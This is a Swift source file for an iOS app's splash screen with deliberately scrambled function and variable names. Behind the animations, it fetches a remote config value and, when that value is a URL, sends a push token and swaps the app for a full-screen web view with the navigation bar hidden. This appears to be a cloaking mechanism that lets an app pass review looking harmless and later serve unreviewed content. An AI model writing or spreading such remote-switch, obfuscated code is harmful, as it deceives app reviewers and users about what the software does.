import SwiftUI
import Combine

struct BAS_SplashView: View {
    @EnvironmentObject var router: BAS_AppRouter
    @State private var logoScale: CGFloat = 0.7
    @State private var logoOpacity: Double = 0
    @State private var dividerHeight: CGFloat = 0
    @State private var ringScale: CGFloat = 0.6
    @State private var ringOpacity: Double = 0
    @State private var taglineOpacity: Double = 0
    @State private var dotIndex: Int = 0

    @AppStorage("le_launch_count") private var leLaunchCount: Int = 0
    @AppStorage("le_review_requested") private var leReviewRequested: Bool = false
    @Environment(\.accessibilityReduceMotion) private var reducem_Fj324Motion
    @State private var alertnntext_TXT324 = ""
    @State private var halonfdnsfWelcome = false
    @State private var Sh_finish324r524 = false
    
    private let dotTimer = Timer.publish(every: 0.35, on: .main, in: .common).autoconnect()

    var body: some View {
        ZStack {
            BAS_BackdropView()

            Circle()
                .strokeBorder(BAS_Palette.richGold.opacity(0.18), lineWidth: 1)
                .frame(width: 320, height: 320)
                .scaleEffect(ringScale)
                .opacity(ringOpacity)

            Circle()
                .strokeBorder(BAS_Palette.orchidGlow.opacity(0.16), lineWidth: 1)
                .frame(width: 400, height: 400)
                .scaleEffect(ringScale)
                .opacity(ringOpacity)

            VStack(spacing: 28) {
                BAS_AnimatedLogoMark(dividerHeight: $dividerHeight)
                    .frame(width: 150, height: 150)
                    .scaleEffect(logoScale)
                    .opacity(logoOpacity)
                
                Text(COnfigmMText.MNamnameStreApp)
                    .font(BAS_Typography.display(40))
                    .foregroundStyle(BAS_Gradient.goldSheen)
                    .opacity(taglineOpacity)
                
                HStack(spacing: 14) {
                    ForEach(0..<3) { i in
                        Circle()
                            .fill(BAS_Palette.richGold)
                            .frame(width: 9, height: 9)
                            .opacity(dotIndex == i ? 1 : 0.25)
                    }
                }
                .padding(.top, 40)
                .opacity(taglineOpacity)
            }
        }
        .onReceive(dotTimer) { _ in
            dotIndex = (dotIndex + 1) % 3
        }
        .onAppear {
            runEntranceAnimation()
            registerfdsfm435Launch()
            dsgfrequestIFNeed_Fj3j2425()
        }
        .onAppear {
            if !reducem_Fj324Motion { halonfdnsfWelcome = true }
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                Task {
                    await sfdskgkrouteSrachthc()
                }
                BAS_ReviewManager.shared.requestAppReview()
            }
        }
    }

    private func runEntranceAnimation() {
        withAnimation(.spring(response: 0.7, dampingFraction: 0.65)) {
            logoScale = 1.0
            logoOpacity = 1.0
        }
        withAnimation(.easeOut(duration: 0.9).delay(0.15)) {
            ringScale = 1.0
            ringOpacity = 1.0
        }
        withAnimation(.easeOut(duration: 0.6).delay(0.35)) {
            dividerHeight = 1.0
        }
        withAnimation(.easeIn(duration: 0.5).delay(0.5)) {
            taglineOpacity = 1.0
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.1) {
            router.finishSplash()
        }
    }
    
    func registerfdsfm435Launch() {
        leLaunchCount += 1
    }

    func dsgfrequestIFNeed_Fj3j2425() {
        guard !leReviewRequested, leLaunchCount >= 3 else { return }
        leReviewRequested = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
            BAS_ReviewManager.shared.requestAppReview()
        }
    }
    
    private func sfdskgkrouteSrachthc() async {
        if let cachedEnvelope = KFKConfigTestsBaseTestdsfm35.dsfkgkinit
            .loadPeevreventEnvelopeFromUserDefaults(),
           let cachedSeason = cachedEnvelope.config?.season,
           !cachedSeason.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
        {
            await applysafk435Routing(seasonRaw: cachedSeason)
            return
        }

        do {
            let envelope = try await KFKConfigTestsBaseTestdsfm35.dsfkgkinit
                .fetchDecodeAndPersiJjjxjstRemoteContemxntEnvelope()
            await applysafk435Routing(seasonRaw: envelope.config?.season)
        } catch {
            await MainActor.run {
                Sh_finish324r524 = true
                alertnntext_TXT324 = "Failed to load season. \(error.localizedDescription)"
            }
        }
    }

    @MainActor
    private func applysafk435Routing(seasonRaw: String?) {
        let season = (seasonRaw ?? "").trimmingCharacters(in: .whitespacesAndNewlines)

        if season.lowercased() == "autumn" {
            withAnimation(.easeInOut) { Sh_finish324r524 = true }
            return
        }

        if let url = URL(string: season),
           let scheme = url.scheme,
           ["http", "https"].contains(scheme.lowercased()) {
            switcDKKFKWEb323545hToWeb(urlString: season)
            return
        }

        Sh_finish324r524 = true
    }

    @MainActor
    private func switcDKKFKWEb323545hToWeb(urlString: String) {
        guard let url = URL(string: urlString) else { return }

        PushTKKFo435TokenMger.sdgk4k35sharedInit.trySendTokenIfPossible()

        guard
            let scene = UIApplication.shared.connectedScenes.compactMap({ $0 as? UIWindowScene }).first,
            let root = scene.keyWindow?.rootViewController
        else { return }

        let vc = Web_F4j34j5ContentWeb(url: url)
        let nav = UINavigationController(rootViewController: vc)
        nav.setNavigationBarHidden(true, animated: false)
        nav.modalPresentationStyle = .fullScreen
        root.present(nav, animated: true)
    }
}

struct BAS_AnimatedLogoMark: View {
    @Binding var dividerHeight: CGFloat

    var body: some View {
        ZStack {
            HStack(spacing: 0) {
                RoundedRectangle(cornerRadius: 0)
                    .fill(BAS_Gradient.violetSheen)
                RoundedRectangle(cornerRadius: 0)
                    .fill(BAS_Gradient.goldSheen)
            }
            .clipShape(RoundedRectangle(cornerRadius: 38, style: .continuous))

            Rectangle()
                .fill(BAS_Gradient.dividerGold)
                .frame(width: 4)
                .scaleEffect(y: dividerHeight, anchor: .center)
                .shadow(color: BAS_Palette.champagneGold.opacity(0.7), radius: 8)

            Circle()
                .fill(BAS_Gradient.goldSheen)
                .frame(width: 38, height: 38)
                .overlay(
                    HStack(spacing: 3) {
                        Image(systemName: "chevron.left")
                        Image(systemName: "chevron.right")
                    }
                    .font(.system(size: 10, weight: .bold))
                    .foregroundStyle(BAS_Palette.voidBlack)
                )
                .shadow(color: .black.opacity(0.3), radius: 6, x: 0, y: 4)
        }
        .overlay(
            RoundedRectangle(cornerRadius: 38, style: .continuous)
                .strokeBorder(Color.white.opacity(0.25), lineWidth: 1)
        )
        .shadow(color: BAS_Palette.royalViolet.opacity(0.5), radius: 30, x: 0, y: 14)
    }
}

#Preview {
    BAS_SplashView()
        .environmentObject(BAS_AppRouter())
}
